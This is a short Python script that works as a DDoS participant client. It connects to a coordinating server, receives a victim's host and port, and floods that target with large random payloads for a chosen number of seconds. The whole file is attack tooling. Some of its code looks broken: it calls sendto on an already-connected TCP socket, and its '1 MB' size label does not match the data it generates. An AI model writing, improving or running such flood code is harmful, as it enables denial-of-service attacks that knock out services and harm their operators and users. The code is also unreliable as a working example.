import socket
import random
import time

B_IN_MB = 10485760

HOST = input("Enter server's host (IP): ")
PORT = int(input("Enter server's port: "))
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    try:
        s.connect((HOST, PORT))
        print("Connected to server")
    except:
        print("Connection refused")
        exit()
    while input("Enter 'start' for joining to DDoS> ") != 'start':
        pass
    message = "DDoS"
    vhost = ''
    vport = ''
    s.sendall(message.encode('utf-8'))
    data = s.recv(1024).decode('utf-8')
    if len(data.split(":")) == 2:
        data = data.split(":")
        vhost = data[0]
        vport = int(data[1])
        print("Recieved victim's host and victim's port")
    else:
        print("Recieved from server some trash")
    while input("Enter 'start' to start DDoSing the victim> ") != 'start':
        pass
    a = int(input("Enter DDoSing time in seconds: "))
    timeout = a + time.time()

    while timeout > time.time():
        s.sendto(("%032x" % random.getrandbits(B_IN_MB)).encode('utf-8'), (vhost, vport))
        print(f"Sent {B_IN_MB} B = 1 MB")
        pass
    print("DDoSing ended")
    exit()
